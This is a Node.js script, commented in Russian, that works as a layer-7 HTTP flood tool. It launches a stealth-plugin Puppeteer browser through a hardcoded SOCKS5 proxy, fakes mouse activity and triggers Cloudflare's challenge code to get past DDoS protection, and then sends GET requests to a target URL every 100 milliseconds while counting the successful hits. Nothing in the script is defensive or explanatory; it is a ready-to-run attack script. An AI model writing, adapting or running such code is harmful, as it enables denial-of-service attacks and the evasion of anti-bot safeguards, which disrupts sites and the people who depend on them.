const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Глубокая настройка stealth
const stealth = StealthPlugin();
stealth.enabledEvasions.delete('user-agent-override');
puppeteer.use(stealth);

// Конфигурация
const PROXY = 'socks5://64.69.43.232:1080'; // SOCKS5 лучше для Cloudflare
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const TIMEOUT = 90000; // 90 секунд

async function launchBrowser() {
    const agent = new SocksProxyAgent(PROXY);
    
    return await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            `--proxy-server=${PROXY.split('://')[1]}`,
            '--lang=en-US,en'
        ],
        ignoreHTTPSErrors: true,
        executablePath: '/usr/bin/google-chrome'
    });
}

async function bypassProtection(page, targetUrl) {
    try {
        console.log('🔄 Обход защиты...');
        
        // Улучшенная эмуляция человеческого поведения
        await page.mouse.move(100, 100);
        await page.waitForTimeout(2000);
        await page.mouse.click(100, 100, { delay: 150 });
        
        // Решение JS-челленджей
        await page.evaluate(() => {
            if (typeof window.___cf_chl_opt === 'object') {
                window.___cf_chl_opt.onLoad();
            }
        });
        
        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: TIMEOUT });
        return true;
    } catch (error) {
        console.error('⚠️ Ошибка обхода:', error.message);
        return false;
    }
}

async function attack() {
    const targetUrl = 'https://uam.dstat123.uk/91d3e5fd-1b84-46ae-8273-5447dd8fe535';
    let browser;
    
    try {
        console.log('🚀 Запуск браузера...');
        browser = await launchBrowser();
        const page = await browser.newPage();
        
        // Настройка сессии
        await page.setUserAgent(USER_AGENT);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120"'
        });

        console.log(`🌐 Переход на ${targetUrl}`);
        await page.goto(targetUrl, {
            waitUntil: 'domcontentloaded',
            timeout: TIMEOUT
        });

        // Проверка защиты
        const title = await page.title();
        if (title.includes('Just a moment') || title.includes('DDoS protection')) {
            if (!await bypassProtection(page, targetUrl)) {
                throw new Error('Не удалось обойти защиту');
            }
        }

        console.log('✅ Успешное подключение. Начинаем флуд...');
        startFlood(targetUrl);

    } catch (error) {
        console.error(`💥 Критическая ошибка: ${error.message}`);
    } finally {
        if (browser) await browser.close();
    }
}

function startFlood(targetUrl) {
    const agent = new SocksProxyAgent(PROXY);
    let successCount = 0;
    
    const flood = setInterval(async () => {
        try {
            await axios.get(targetUrl, {
                httpsAgent: agent,
                timeout: 5000,
                headers: {
                    'User-Agent': USER_AGENT,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
            });
            successCount++;
            process.stdout.write('.');
        } catch (e) {
            process.stdout.write('x');
        }
    }, 100);

    // Статистика
    setInterval(() => {
        console.log(`\n📊 Успешных запросов: ${successCount}`);
    }, 10000);
}

// Запуск
attack().catch(console.error);
